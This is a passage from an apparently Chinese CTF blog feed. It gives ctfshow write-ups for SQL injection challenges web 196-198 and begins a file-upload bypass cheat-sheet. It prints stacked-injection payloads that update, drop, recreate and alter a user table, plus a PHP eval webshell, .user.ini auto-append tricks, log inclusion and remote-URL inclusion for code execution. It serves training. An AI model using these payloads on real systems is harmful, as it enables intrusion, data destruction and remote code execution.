&lt;p&gt;查询语句&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 拼接 sql 语句查找指定 ID 用户&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;select pass from ctfshow_user where username = &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;返回逻辑&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 密码检测&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;密码只能为数字&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 密码判断&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;pass&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;登陆成功&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&#34;|select|union|or|and|\x26|\x7c|file|into/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;用户名非法&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;登陆成功 flag is &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$flag&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以使用修改表的方法&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;ctfshow_user&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;pass&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;将密码重置为 1&lt;/p&gt;
&lt;h1 id=&#34;web-197&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-197&#34;&gt;#&lt;/a&gt; web 197&lt;/h1&gt;
&lt;p&gt;查询语句&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 拼接 sql 语句查找指定 ID 用户&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;select pass from ctfshow_user where username = {$username};&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;返回逻辑&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;preg_match&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/\*|\#\-|\x23|\&#39;|\&#34;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;$username&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;{&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    $ret&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;用户名非法&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    die&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;json_encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;}&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token keyword&#34;&gt;row&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; $password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;{&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    $ret&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;登陆成功 flag is $flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;}&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在这一题中，与前面相比过滤了 update，不能更新，分号还是可以用，即堆叠注入还是可以用，所以不妨直接删除表，然后创建相同名字、字段的表，而数据自己设置&lt;/p&gt;
&lt;p&gt;因此 payload 为&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;drop&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; ctfshow_user&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; ctfshow_user&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;pass&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;insert&lt;/span&gt; ctfshow_user&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;pass&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;web-198&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-198&#34;&gt;#&lt;/a&gt; web 198&lt;/h1&gt;
&lt;p&gt;相比于 197 而言，将 &lt;code&gt;drop&lt;/code&gt;  和 &lt;code&gt;create&lt;/code&gt;  过滤了&lt;/p&gt;
&lt;p&gt;这里可以使用交换列的方法 (前提是知道用户名是什么), 因为在交换了两列之后，查询语句就变为查询原来的 &lt;code&gt;pass&lt;/code&gt;  列，而匹配的密码为原来的 &lt;code&gt;username&lt;/code&gt;  列，而 &lt;code&gt;username&lt;/code&gt;  是知道的，那么即可拿到 flag&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; ctfshow_user change &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;pass2&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; ctfshow_user change &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;pass&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; ctfshow_user change &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;pass2&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token identifier&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;pass&lt;span class=&#34;token punctuation&#34;&gt;`&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/592e5fba/</guid>
            <title>文件上传</title>
            <link>http://dpm12345.cn/posts/592e5fba/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Tue, 04 Oct 2022 22:14:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;情况&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#情况&#34;&gt;#&lt;/a&gt; 情况&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;仅仅有前端验证，将前端代码删去一些&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;后端仅验证后缀，改后缀&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;后端仅验证 &lt;code&gt;content-type&lt;/code&gt; ，改为可以上传的内容类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;后端验证内容头，输入一个要求上传格式的内容头&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;后端验证文件内容，如 &lt;code&gt;php&lt;/code&gt;  过滤，可以使用短标签&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户配置文件可以上传，采用 &lt;code&gt;auto_append_file=1.txt&lt;/code&gt; ，(前提是有默认 &lt;code&gt;index.php&lt;/code&gt;  可以打开) 然后在 &lt;code&gt;1.txt&lt;/code&gt;  内容进行控制&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;内容不允许有方括号，即普通的一句话木马不能上传，可以将方括号改为大括号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一句话木马也可写成 &lt;code&gt;&amp;lt;?php eval (array_pop ($_POST));?&amp;gt;&lt;/code&gt; , 同样也可&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;过滤括号可以使用文件包含的，因为文件包含可以不写括号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果对某一字符串进行过滤，可以采用分开写的方式绕过，如日志包含过滤了 log，那么可以写成 &lt;code&gt;&amp;lt;?=include &#39;/var/l&#39;.&#39;og/nginx/access.l&#39;.&#39;og?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;空格过滤，可以使用换行代替（十六进制下用 &lt;code&gt;0d&lt;/code&gt; ）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;过滤点号后，由于此时不能包含任何一个带点的文件 (如 log), 那么此时也可以使用远程 url 包含，先上传一个 &lt;code&gt;.user.ini&lt;/code&gt;  自动加载没有点作为名字的文件，然后在该文件上传一个远程包含 url (其中 url 有一句话木马，该 url 为常地址不带点)，那么就可以 rce 了；另外也可以使用 session 包含竞争&lt;/p&gt;
